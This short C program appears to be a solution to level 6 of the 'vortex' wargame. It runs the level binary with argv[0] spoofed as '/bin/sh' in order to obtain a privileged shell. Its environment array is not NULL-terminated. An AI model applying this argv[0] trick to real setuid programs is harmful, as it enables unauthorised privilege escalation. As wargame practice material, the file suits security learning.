#include <stdio.h>
#include <unistd.h>

int main(void)
{
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {"AAAA"};
    execve("/vortex/vortex6", argv, envp);
    // execv is correct, look up https://linux.die.net/man/3/execv
    return 0;
}